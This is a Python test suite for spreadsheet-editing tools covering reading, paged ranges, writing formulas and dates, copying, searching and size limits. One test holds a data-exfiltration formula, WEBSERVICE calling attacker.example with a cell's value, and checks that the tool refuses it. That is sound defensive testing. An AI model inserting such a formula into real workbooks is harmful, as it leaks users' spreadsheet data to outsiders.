import datetime as dt
from pathlib import Path

import pytest
from openpyxl import load_workbook

from tests.conftest import ToolCall

pytestmark = pytest.mark.anyio


async def test_read_used_range(call: ToolCall, sample: Path) -> None:
    data = await call("read_range", path="sales.xlsx", sheet="Data")
    assert data["range"] == "A1:D5"
    assert data["values"][1] == ["North", "Apples", 10, 1.5]
    assert data["truncated"] is False


async def test_read_pages_large_ranges(call: ToolCall, sample: Path) -> None:
    first = await call("read_range", path="sales.xlsx", sheet="Data", range="A1:D5", max_cells=8)
    assert first["range"] == "A1:D2"
    assert first["truncated"] is True
    assert first["next_range"] == "A3:D5"
    rest = await call("read_range", path="sales.xlsx", sheet="Data", range=first["next_range"])
    assert rest["values"][0] == ["South", "Apples", 5, 1.5]


async def test_write_values_formulas_and_dates(call: ToolCall, sample: Path) -> None:
    result = await call(
        "write_range",
        path="sales.xlsx",
        sheet="Report",
        start_cell="B2",
        rows=[["Total", "=SUM(Data!C2:C5)"], ["When", "2026-01-31"], ["ID", "000123"]],
    )
    assert result == {"sheet": "Report", "range": "B2:C4", "cells_written": 6}
    sheet = load_workbook(sample)["Report"]
    assert sheet["C2"].value == "=SUM(Data!C2:C5)"
    assert sheet["C3"].value == dt.datetime(2026, 1, 31)
    assert sheet["C3"].number_format == "yyyy-mm-dd"
    assert sheet["C4"].value == "000123"


async def test_read_modes(call: ToolCall, sample: Path) -> None:
    await call("write_range", path="sales.xlsx", sheet="Report", start_cell="A1", rows=[["=1+1"]])
    formulas = await call("read_range", path="sales.xlsx", sheet="Report", mode="formulas")
    assert formulas["values"] == [["=1+1"]]
    values = await call("read_range", path="sales.xlsx", sheet="Report", mode="values")
    assert values["values"] == [[None]]


async def test_write_rejects_unsafe_formulas_without_saving(
    call_error: ToolCall, sample: Path
) -> None:
    before = sample.read_bytes()
    message = await call_error(
        "write_range",
        path="sales.xlsx",
        sheet="Report",
        start_cell="A1",
        rows=[["ok"], ['=webservice("https://attacker.example/?d="&Data!A2)']],
    )
    assert "WEBSERVICE is not allowed" in message
    assert sample.read_bytes() == before


async def test_write_into_merged_cell_is_rejected(call_error: ToolCall, sample: Path) -> None:
    workbook = load_workbook(sample)
    workbook["Report"].merge_cells("A1:B1")
    workbook.save(sample)
    message = await call_error(
        "write_range", path="sales.xlsx", sheet="Report", start_cell="B1", rows=[["x"]]
    )
    assert "merged" in message


async def test_clear_range(call: ToolCall, sample: Path) -> None:
    await call("format_range", path="sales.xlsx", sheet="Data", range="A1:D1", style={"bold": True})
    await call("clear_range", path="sales.xlsx", sheet="Data", range="A1:B1", clear="all")
    sheet = load_workbook(sample)["Data"]
    assert sheet["A1"].value is None
    assert sheet["A1"].font.bold is False
    assert sheet["C1"].font.bold is True


async def test_copy_range_shifts_relative_references(call: ToolCall, sample: Path) -> None:
    await call("write_range", path="sales.xlsx", sheet="Data", start_cell="E2", rows=[["=C2*D2"]])
    await call("copy_range", path="sales.xlsx", sheet="Data", range="E2", target_cell="E3")
    await call(
        "copy_range",
        path="sales.xlsx",
        sheet="Data",
        range="A1:B2",
        target_cell="A1",
        target_sheet="Report",
    )
    workbook = load_workbook(sample)
    assert workbook["Data"]["E3"].value == "=C3*D3"
    assert workbook["Report"]["B2"].value == "Apples"


async def test_find_cells(call: ToolCall, sample: Path) -> None:
    found = await call("find_cells", path="sales.xlsx", query="north")
    assert [match["cell"] for match in found["matches"]] == ["A2", "A4"]
    exact = await call("find_cells", path="sales.xlsx", query="Pear", exact=True)
    assert exact["matches"] == []
    limited = await call("find_cells", path="sales.xlsx", query="s", max_results=2)
    assert limited["truncated"] is True


@pytest.mark.parametrize(
    ("tool", "arguments"),
    [
        ("clear_range", {"range": "A1:XFD1048576"}),
        ("copy_range", {"range": "A1:XFD1048576", "target_cell": "A1"}),
        ("format_range", {"range": "A1:XFD1048576", "style": {"bold": True}}),
        ("merge_cells", {"range": "A1:XFD1048576"}),
        ("read_range", {"range": "A1:XFD1"}),
    ],
)
async def test_huge_ranges_are_rejected_quickly(
    call_error: ToolCall, sample: Path, tool: str, arguments: dict[str, object]
) -> None:
    message = await call_error(tool, path="sales.xlsx", sheet="Data", **arguments)
    assert "at most" in message
